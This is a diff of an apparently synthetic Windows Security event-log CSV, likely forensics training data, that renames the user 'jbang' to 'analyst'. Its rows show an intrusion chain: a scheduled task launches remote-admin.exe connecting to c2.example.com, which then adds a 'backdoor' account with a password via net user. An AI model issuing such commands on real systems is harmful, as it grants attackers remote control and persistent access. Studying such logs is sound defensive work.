@@ -1,7 +1,7 @@
 RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,Computer,UserName,PayloadData1,PayloadData2,PayloadData3
-1,1001,2026-03-15 14:19:47,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,SYSTEM,NewProcessName=C:\Windows\System32\rundll32.exe,ParentProcessName=C:\Windows\explorer.exe,SubjectUserName=jbang
-2,1002,2026-03-15 14:22:00,4624,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,jbang,LogonType=2,AuthenticationPackageName=Negotiate,WorkstationName=WKS-07
-3,1003,2026-03-15 14:22:03,4698,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,SYSTEM,TaskName=\RemoteHandsSync,TaskContent=C:\Users\jbang\Downloads\remote-admin.exe,
-4,1004,2026-03-15 14:23:11,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,jbang,NewProcessName=C:\Users\jbang\Downloads\remote-admin.exe,ParentProcessName=C:\Windows\System32\taskeng.exe,CommandLine=remote-admin.exe --connect c2.example.com
-5,1005,2026-03-15 14:35:02,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,jbang,NewProcessName=C:\Windows\System32\net.exe,ParentProcessName=C:\Users\jbang\Downloads\remote-admin.exe,CommandLine=net user backdoor P@ssw0rd! /add
-6,1006,2026-03-15 09:01:00,4663,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,jbang,ObjectName=C:\Users\jbang\Documents\quarterly-report.docx,AccessMask=0x1,ProcessName=WINWORD.EXE
+1,1001,2026-03-15 14:19:47,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,SYSTEM,NewProcessName=C:\Windows\System32\rundll32.exe,ParentProcessName=C:\Windows\explorer.exe,SubjectUserName=analyst
+2,1002,2026-03-15 14:22:00,4624,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,analyst,LogonType=2,AuthenticationPackageName=Negotiate,WorkstationName=WKS-07
+3,1003,2026-03-15 14:22:03,4698,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,SYSTEM,TaskName=\RemoteHandsSync,TaskContent=C:\Users\analyst\Downloads\remote-admin.exe,
+4,1004,2026-03-15 14:23:11,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,analyst,NewProcessName=C:\Users\analyst\Downloads\remote-admin.exe,ParentProcessName=C:\Windows\System32\taskeng.exe,CommandLine=remote-admin.exe --connect c2.example.com
+5,1005,2026-03-15 14:35:02,4688,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,analyst,NewProcessName=C:\Windows\System32\net.exe,ParentProcessName=C:\Users\analyst\Downloads\remote-admin.exe,CommandLine=net user backdoor P@ssw0rd! /add
+6,1006,2026-03-15 09:01:00,4663,Information,Microsoft-Windows-Security-Auditing,Security,WKS-07,analyst,ObjectName=C:\Users\analyst\Documents\quarterly-report.docx,AccessMask=0x1,ProcessName=WINWORD.EXE
